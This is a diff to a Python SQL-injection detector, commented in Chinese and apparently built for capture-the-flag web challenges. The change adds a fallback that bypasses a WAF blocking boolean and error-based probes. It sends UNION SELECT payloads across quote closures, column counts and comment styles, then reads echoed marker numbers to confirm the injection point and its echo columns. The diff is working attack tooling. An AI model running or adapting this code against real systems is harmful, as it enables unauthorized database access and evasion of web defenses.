@@ -77,7 +77,12 @@ class Detector:
                 inj.closure = closure
                 inj.numeric = False
             else:
-                self.log("WARN", "未发现明显注入点（闭合探测无 SQL 报错，数字型布尔无差异）")
+                # 兜底：WAF 只放行 union、把 and/or 与报错全掐死时（web203），
+                # 布尔/报错两条路都走不通，直接 union 试闭合+列数+回显
+                uni = self._probe_union_first()
+                if uni is not None:
+                    return uni
+                self.log("WARN", "未发现明显注入点（闭合探测无 SQL 报错，数字型布尔无差异，union 无回显）")
                 return None
         inj.form = self.form
 
@@ -123,6 +128,42 @@ class Detector:
                 return
 
     # ------------------------------------------------------------------ closure
+    def _probe_union_first(self) -> Optional[InjectionPoint]:
+        """union 优先的闭合探测（WAF 只放过 union 时唯一可行的一条路）。
+
+        对每个候选闭合/注释/列数直接发 `union select 9137,9150,...`，
+        回显里出现这些独特数字即说明：闭合正确、列数正确、该列可回显。
+        """
+        base = self.s.spec.base_value or "1"
+        for suffix in ("'", '"', "", "')", '")'):
+            for cols in (2, 3, 4, 5):
+                nums = [str(9137 + i * 13) for i in range(cols)]
+                for tail in ("#", "-- "):
+                    payload = f"{base}{suffix} union select {','.join(nums)}{tail}"
+                    r = self._send(payload)
+                    if r.status_code < 0:
+                        continue
+                    hits = [i + 1 for i, n in enumerate(nums) if n in r.body]
+                    if not hits:
+                        continue
+                    inj = InjectionPoint(param=self.s.spec.param,
+                                         base_value=base,
+                                         closure=suffix, numeric=(suffix == ""))
+                    inj.comment = tail.strip()
+                    inj.column_count = cols
+                    inj.echo_positions = hits
+                    inj.form = "classic"
+                    self.form = "classic"
+                    self.log("INFO", f"union 优先探测命中：闭合 {suffix!r}，"
+                                     f"{cols} 列，回显位 {hits}")
+                    self.s.record_step(
+                        "确认注入点（union 回显）",
+                        payload,
+                        f"and/or/报错均不可用时，union 直接确认闭合 {suffix!r}、"
+                        f"{cols} 列、回显位 {hits}")
+                    return inj
+        return None
+
     def _probe_closure(self) -> Optional[str]:
         """逐一试探引号类闭合：
         1) 报错法：suffix 引发 SQL 报错即命中；
